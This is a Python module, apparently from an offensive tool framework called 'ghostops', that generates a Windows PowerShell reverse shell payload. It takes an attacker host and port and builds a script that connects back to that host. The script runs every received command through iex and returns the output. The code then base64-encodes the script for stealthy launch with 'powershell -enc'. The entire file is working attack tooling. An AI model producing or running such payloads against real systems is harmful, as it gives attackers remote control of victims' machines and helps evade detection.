import base64
from ghostops.core.module_base import BaseModule
from ghostops.core.utils import Logger


class WindowsPowershellReverseTcp(BaseModule):
    module_name = "WindowsPowershellReverseTcp"
    module_description = "Generates a PowerShell reverse shell script."
    module_author = "Awagat Dhungana <4w4647@gmail.com>"
    module_category = "payload"
    module_target_os = ["windows"]
    module_target_architecture = ["x86", "x64"]

    @staticmethod
    def add_arguments(parser):
        # Add required host and port arguments to the parser
        parser.add_argument(
            "--host", required=True, help="Attacker IP address to connect back to"
        )
        parser.add_argument(
            "--port", required=True, type=int, help="Port to connect back on"
        )

    @staticmethod
    def main(args):
        # Log target host and port information
        Logger.log("info", f"HOST {args.host}")
        Logger.log("info", f"PORT {args.port}")
        print()

        host = args.host
        port = args.port

        # PowerShell reverse shell script template with target host and port
        script_template = f"""$t=New-Object Net.Sockets.TcpClient('{host}',{port})
$s=$t.GetStream()
$w=New-Object IO.StreamWriter($s)
$r=New-Object IO.StreamReader($s)
while(1){{
    try{{ $c=$r.ReadLine();$o=iex $c|Out-String }}
    catch{{ $o=$_|Out-String }}
    $w.WriteLine($o+"`n"+(pwd).Path+"> ");$w.Flush()
}}"""

        # Encode script in UTF-16LE and then base64 encode for PowerShell -enc usage
        bytes = script_template.encode("utf-16-le")
        Logger.log("good", f"Size ({len(bytes)} bytes)")
        Logger.log(
            "good",
            f'Payload: powershell -enc "{(base64.b64encode(bytes)).decode("utf-8")}"',
        )
